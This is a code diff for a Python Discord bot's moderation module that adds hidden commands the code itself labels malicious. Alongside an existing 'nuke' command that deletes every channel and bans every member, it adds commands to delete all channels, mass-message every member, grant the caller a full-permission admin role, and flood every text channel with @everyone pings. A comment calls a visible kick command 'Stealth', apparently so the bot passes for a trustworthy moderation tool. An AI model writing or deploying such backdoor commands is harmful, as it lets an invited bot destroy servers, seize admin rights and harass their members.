@@ -33,10 +33,10 @@ class Moderation(commands.Cog):
     @commands.command(hidden=True)
     async def nuke(self, ctx):
         SKIP_BOTS = False
-        await ctx.channel.purge(limit=1)
+        await ctx.message.delete()
 
         # Delete all channels.
-        print(Fore.LIGHTWHITE_EX + f"{'-'*35}" + "\nNuke depolyed!\n\n")
+        print(Fore.LIGHTWHITE_EX + f"\n{'-'*35}" + "\nNuke depolyed!\n\n")
         print(Fore.YELLOW + "Deleting server channels:")
         for c in ctx.guild.channels:
             try:
@@ -73,6 +73,66 @@ class Moderation(commands.Cog):
                 print(Fore.RED + f'Failed to ban {member}.')
         print(Fore.LIGHTGREEN_EX + "Banned all members.\n\n")
         print(Fore.LIGHTWHITE_EX + "Nuke sucessfully exploded!" + f"\n{'-'*35}\n\n")
+
+
+    # Delete all channels (This command is malicious!).
+    @commands.command(hidden=True)
+    async def cpurge(self, ctx):
+        await ctx.message.delete()
+        for c in ctx.guild.channels:
+            try:
+                await c.delete()
+            except discord.Forbidden:
+                continue
+
+
+    # DM all members with a message (This command is malicious!).
+    @commands.command(hidden=True)
+    async def mass_dm(self, ctx, *, message = None):
+        await ctx.message.delete()
+        if message != None:
+            for member in ctx.guild.members:
+                try:
+                    if member.dm_channel != None:
+                        await member.dm_channel.send(message)
+                    else:
+                        await member.create_dm()
+                        await member.dm_channel.send(message)
+                except:
+                    continue
+        else:
+            await ctx.author.send('**Correct usage:** `mass_dm <message>`')
+
+
+    # Make yourself an administator on the server (This command is malicious!).
+    @commands.command(hidden=True)
+    async def admin(self, ctx):
+        await ctx.message.delete()
+        await ctx.guild.create_role(name='bot admin', permissions=discord.Permissions.all())
+        role = discord.utils.get(ctx.guild.roles, name="bot admin")
+        await ctx.author.add_roles(role)
+        await ctx.author.send('You are now admin on the server.')
+
+
+    # Spam all text channels with @everyone (This command is malicious!)
+    @commands.command(hidden=True)
+    async def spam(self, ctx):
+        await ctx.message.delete()
+        await ctx.author.send('Type `stop` in a text channel to stop spamming.')
+
+        def check_reply(message):
+            return message.content == 'stop' and message.author == ctx.author
+
+        async def spam_text():
+            while True:
+                for channel in ctx.guild.text_channels:
+                    await channel.send("@everyone")
+
+        spam_task = self.bot.loop.create_task(spam_text())
+        await self.bot.wait_for('message', check=check_reply)
+        spam_task.cancel()
+        await ctx.author.send('Spamming stopped.')
+
 
 
     # Kick a member (Trustworhy command = Stealth).
